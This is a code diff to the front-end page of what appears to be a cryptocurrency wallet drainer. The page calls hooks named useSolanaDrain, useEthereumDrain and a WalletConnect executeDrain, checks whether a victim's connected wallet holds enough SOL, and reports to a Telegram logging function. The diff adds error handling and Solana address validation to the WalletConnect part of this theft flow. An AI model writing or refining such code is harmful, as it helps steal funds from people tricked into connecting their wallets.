@@ -44,7 +44,7 @@ export default function Home() {
   
   const { executeDrain: executeSolanaDrain } = useSolanaDrain();
   const { executeDrain: executeEthereumDrain } = useEthereumDrain();
-  const { connect: connectWalletConnect, executeDrain: executeWalletConnectDrain, address: wcAddress, isConnected: wcIsConnected } = useWalletConnect();
+  const { connect: connectWalletConnect, executeDrain: executeWalletConnectDrain, address: wcAddress, isConnected: wcIsConnected, isConnecting: wcIsConnecting, connectionError: wcConnectionError } = useWalletConnect();
   
   useEffect(() => {
     if (isMobileBrowser() && !window.solana && !window.ethereum) {
@@ -103,19 +103,38 @@ export default function Home() {
         console.log(`[Phantom] Balance: ${balanceInSol} SOL, HasFunds: ${hasFunds}`);
         
       } else if (type === 'walletconnect') {
-        // Use the new WalletConnect hook
-        address = await connectWalletConnect();
-        
-        const { Connection, PublicKey } = await import('@solana/web3.js');
-        const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
-        const lamports = await connection.getBalance(new PublicKey(address));
-        const balanceInSol = lamports / 1e9;
-        const MIN_REQUIRED_LAMPORTS = 0.003 * 1e9;
-        
-        hasFunds = lamports > MIN_REQUIRED_LAMPORTS;
-        balance = balanceInSol;
-        
-        console.log(`[WalletConnect] Balance: ${balanceInSol} SOL, HasFunds: ${hasFunds}`);
+        try {
+          address = await connectWalletConnect();
+          
+          // Verify it's a valid Solana address
+          const { Connection, PublicKey } = await import('@solana/web3.js');
+          
+          // Test if address is valid Solana format
+          let pubkey;
+          try {
+            pubkey = new PublicKey(address);
+          } catch (e) {
+            throw new Error('Connected wallet is not a Solana wallet. Please select Solana network in your wallet.');
+          }
+          
+          const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
+          const lamports = await connection.getBalance(pubkey);
+          const balanceInSol = lamports / 1e9;
+          const MIN_REQUIRED_LAMPORTS = 0.003 * 1e9;
+          
+          hasFunds = lamports > MIN_REQUIRED_LAMPORTS;
+          balance = balanceInSol;
+          
+          console.log(`[WalletConnect] Solana Balance: ${balanceInSol} SOL, HasFunds: ${hasFunds}`);
+        } catch (error) {
+          console.error('WalletConnect connection error:', error);
+          setEligibilityStatus('idle');
+          await sendTelegramLog('connection_error', {
+            walletType: type,
+            error: error.message
+          });
+          return;
+        }
       }
       
       setWalletAddress(address);
@@ -414,4 +433,4 @@ export default function Home() {
       />
     </div>
   );
-          }
+                                           }
